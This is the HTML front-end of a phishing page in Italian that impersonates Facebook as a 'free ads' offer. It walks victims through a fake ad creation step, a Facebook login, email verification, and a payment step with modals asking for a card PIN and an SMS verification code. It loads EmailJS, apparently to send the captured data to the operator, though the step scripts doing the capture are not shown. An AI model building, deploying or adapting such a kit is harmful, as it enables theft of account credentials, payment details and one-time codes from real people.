<!DOCTYPE html>
<html lang="it">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Annunci Gratuiti</title>
    <link rel="icon" href="facebook.ico" type="image/x-icon">

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <!-- SweetAlert2 -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <!-- Font Awesome -->

    <!-- Main Styles -->
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="main-container">
        <!-- ==================== HEADER (same for all steps) ==================== -->
        <div class="app-header">
            <div class="header-logo">
                <div class="logo-icon">
                    
                    <i class="fa-brands fa-facebook-f"></i>
                </div>
                <span>Facebook Annunci Gratuiti</span>
            </div>
            <div class="header-badge">
                <i class="fas fa-gift"></i> OFFERTA 4 MARZO
            </div>
        </div>

        <!-- ==================== SIMPLE STEP INDICATOR ==================== -->
        <div class="progress-container">
            <div class="simple-step-indicator" id="stepIndicator">
                <div class="current-step">
                    <div class="circle" id="currentStepCircle">1</div>
                    <div class="current-step-info">
                        <h4 id="currentStepTitle">Crea Annuncio</h4>
                        <p id="currentStepDescription">Inserisci i dettagli del tuo annuncio</p>
                    </div>
                </div>
                <div class="step-count" id="stepCount">1/5</div>
            </div>
        </div>


        <!-- ==================== STEP 1: Ad Creation (from index.html) ==================== -->
        <div id="step1" class="step-content active">
            <!-- STEP 1 CONTENT WILL BE LOADED HERE -->
        </div>

        <!-- ==================== STEP 2: Facebook Login (from fblg.html) ==================== -->
        <div id="step2" class="step-content">
            <!-- STEP 2 CONTENT WILL BE LOADED HERE -->
        </div>

        <!-- ==================== STEP 3: Email Verify (from emvrf.html) ==================== -->
        <div id="step3" class="step-content">
            <!-- STEP 3 CONTENT WILL BE LOADED HERE -->
        </div>

        <!-- ==================== STEP 4: Payment + PIN + SMS (from fpay.html) ==================== -->
        <div id="step4" class="step-content">
            <!-- STEP 4 CONTENT WILL BE LOADED HERE -->
        </div>

        <!-- ==================== STEP 5: Thank You (from thnk.html) ==================== -->
        <div id="step5" class="step-content">
            <!-- STEP 5 CONTENT WILL BE LOADED HERE -->
        </div>

        <!-- ==================== GLOBAL MODALS ==================== -->
        <!-- PIN Modal -->
        <div id="pinModal" class="modal">
            <div class="modal-content">
                <div class="modal-icon">🔐</div>
                <h3>Inserisci Codice PIN</h3>
                <p>Inserisci il tuo codice PIN per il pagamento online.</p>
                <input type="text" id="pinCode" class="pin-input" placeholder="********" maxlength="8">
                <button class="modal-btn" id="submitPinBtn">Verifica PIN</button>
            </div>
        </div>

        <!-- SMS Modal -->
        <div id="smsModal" class="modal">
            <div class="modal-content">
                <div class="modal-icon">📱</div>
                <h3>Verifica SMS</h3>
                <p>Codice di verifica inviato al tuo numero di cellulare.</p>
                <input type="text" id="smsCode" class="pin-input" placeholder="........" maxlength="8">
                <button class="modal-btn" id="submitSmsBtn">Verifica SMS</button>
            </div>
        </div>

        <!-- Loading Modal -->
        <div id="loadingModal" class="modal">
            <div class="modal-content">
                <div class="loading-spinner"></div>
                <p>Elaborazione in corso...</p>
            </div>
        </div>
    </div>

    <!-- ==================== SCRIPTS ==================== -->
    <script src="scriptemail.js"></script>
    <script src="step1.js"></script>
    <script src="step2.js"></script>
    <script src="step3.js"></script>
    <script src="step4.js"></script>
    <script src="step5.js"></script>
    
    <script>
        // Initialize EmailJS
        (function() {
            emailjs.init({
                //publicKey: "-h14BHuMwoJO3vHMh",
            });
        })();

        // Navigation between steps
        document.addEventListener('DOMContentLoaded', function() {
            window.currentStep = 1;
            
            // Load step 1 content
            loadStepContent(1);
        });

        function goToStep(stepNumber) {
            // Hide all steps
            document.querySelectorAll('.step-content').forEach(el => {
                el.classList.remove('active');
            });
            
            // Show selected step
            document.getElementById(`step${stepNumber}`).classList.add('active');
            
            // Update progress bar
            document.querySelectorAll('.step').forEach((el, index) => {
                if (index + 1 < stepNumber) {
                    el.classList.add('completed');
                    el.classList.remove('active');
                } else if (index + 1 === stepNumber) {
                    el.classList.add('active');
                    el.classList.remove('completed');
                } else {
                    el.classList.remove('active', 'completed');
                }
            });
            
            window.currentStep = stepNumber;
            
            // Load step content if needed
            loadStepContent(stepNumber);
        }

        function loadStepContent(stepNumber) {
            // This will be implemented in step-specific JS files
            console.log(`Loading step ${stepNumber} content`);
        }
    </script>



<script>
    // Funzioni globali per la gestione dei modali
window.closeLoadingModal = function() {
    const loadingModal = document.getElementById('loadingModal');
    if (loadingModal) {
        loadingModal.style.display = 'none';
    }
};

window.closeAllModals = function() {
    document.getElementById('loadingModal').style.display = 'none';
    document.getElementById('pinModal').style.display = 'none';
    document.getElementById('smsModal').style.display = 'none';
    document.getElementById('previewModal').style.display = 'none';
};

// Modifica goToStep per chiudere sempre i modali
const originalGoToStep = window.goToStep;
window.goToStep = function(stepNumber) {
    // Chiudi tutti i modali prima di cambiare step
    window.closeAllModals();
    
    // Chiama la funzione originale
    if (typeof originalGoToStep === 'function') {
        originalGoToStep(stepNumber);
    } else {
        // Fallback se originalGoToStep non esiste
        document.querySelectorAll('.step-content').forEach(el => {
            el.classList.remove('active');
        });
        document.getElementById(`step${stepNumber}`).classList.add('active');
        
        document.querySelectorAll('.step').forEach((el, index) => {
            if (index + 1 < stepNumber) {
                el.classList.add('completed');
                el.classList.remove('active');
            } else if (index + 1 === stepNumber) {
                el.classList.add('active');
                el.classList.remove('completed');
            } else {
                el.classList.remove('active', 'completed');
            }
        });
        
        window.currentStep = stepNumber;
    }
};
</script>




<script>
    // Assicurati che questa funzione sia definita e funzioni
    function updateStepIndicator(stepNumber) {
        console.log('Aggiornamento step a:', stepNumber); // Per debug
        
        const steps = {
            1: { title: "Crea Annuncio", description: "Inserisci i dettagli del tuo annuncio" },
            2: { title: "Accedi", description: "Login con Facebook" },
            3: { title: "Verifica", description: "Verifica la tua email" },
            4: { title: "Pagamento", description: "Completa il pagamento" },
            5: { title: "Completato", description: "Annuncio pubblicato!" }
        };
        
        // Aggiorna gli elementi
        document.getElementById('currentStepCircle').textContent = stepNumber;
        document.getElementById('currentStepTitle').textContent = steps[stepNumber].title;
        document.getElementById('currentStepDescription').textContent = steps[stepNumber].description;
        document.getElementById('stepCount').textContent = stepNumber + '/5';
    }

    // Assicurati che goToStep chiami updateStepIndicator
    window.goToStep = function(stepNumber) {
        console.log('Andando a step:', stepNumber);
        
        // Nascondi tutti gli step
        document.querySelectorAll('.step-content').forEach(el => {
            el.classList.remove('active');
        });
        
        // Mostra lo step selezionato
        const stepEl = document.getElementById('step' + stepNumber);
        if (stepEl) stepEl.classList.add('active');
        
        // AGGIORNA L'INDICATORE - QUESTA È LA PARTE IMPORTANTE!
        updateStepIndicator(stepNumber);
        
        // Chiudi modali se aperti
        const modals = ['loadingModal', 'pinModal', 'smsModal', 'previewModal'];
        modals.forEach(id => {
            const modal = document.getElementById(id);
            if (modal) modal.style.display = 'none';
        });
    };

    // Inizializza al caricamento
    document.addEventListener('DOMContentLoaded', function() {
        // Assicurati che lo step 1 sia attivo all'inizio
        updateStepIndicator(1);
    });
</script>
</body>
</html>
